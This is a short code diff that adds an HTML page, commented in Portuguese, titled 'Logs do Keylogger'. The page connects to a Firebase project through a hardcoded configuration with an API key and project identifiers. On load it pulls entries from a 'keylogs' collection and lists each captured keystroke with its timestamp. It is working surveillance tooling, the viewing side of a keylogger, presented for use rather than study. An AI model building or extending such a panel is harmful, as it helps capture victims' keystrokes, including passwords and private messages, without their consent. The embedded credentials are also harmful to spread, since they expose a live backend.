@@ -1,1 +1,52 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Logs do Keylogger</title>
+  <!-- Adicione as tags do Firebase SDK -->
+  <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js"></script>
+</head>
+<body>
+  <h1>Logs do Keylogger</h1>
+  <div id="logs"></div>
 
+  <!-- Configuração do Firebase -->
+  <script>
+    // Substitua os valores pelos de sua configuração do Firebase
+    const firebaseConfig = {
+  apiKey: "AIzaSyD97RPWRXb1ctksvWSvzm3NZ0earAn7Mcc",
+  authDomain: "visualizado-realtime.firebaseapp.com",
+  databaseURL: "https://visualizado-realtime-default-rtdb.firebaseio.com",
+  projectId: "visualizado-realtime",
+  storageBucket: "visualizado-realtime.appspot.com",
+  messagingSenderId: "279838352172",
+  appId: "1:279838352172:web:1f948ee868297e229d8289"
+};
+
+    // Inicializar o Firebase
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.firestore();
+
+    // Função para obter e exibir os logs
+    function getLogs() {
+      db.collection("keylogs").orderBy("timestamp").get().then((querySnapshot) => {
+        const logsDiv = document.getElementById("logs");
+        logsDiv.innerHTML = ""; // Limpar conteúdo anterior
+        querySnapshot.forEach((doc) => {
+          const log = doc.data();
+          const logElement = document.createElement("div");
+          logElement.textContent = `${log.timestamp}: ${log.key}`;
+          logsDiv.appendChild(logElement);
+        });
+      }).catch((error) => {
+        console.error("Erro ao obter logs: ", error);
+      });
+    }
+
+    // Chamar a função para obter logs ao carregar a página
+    window.onload = getLogs;
+  </script>
+</body>
+</html>
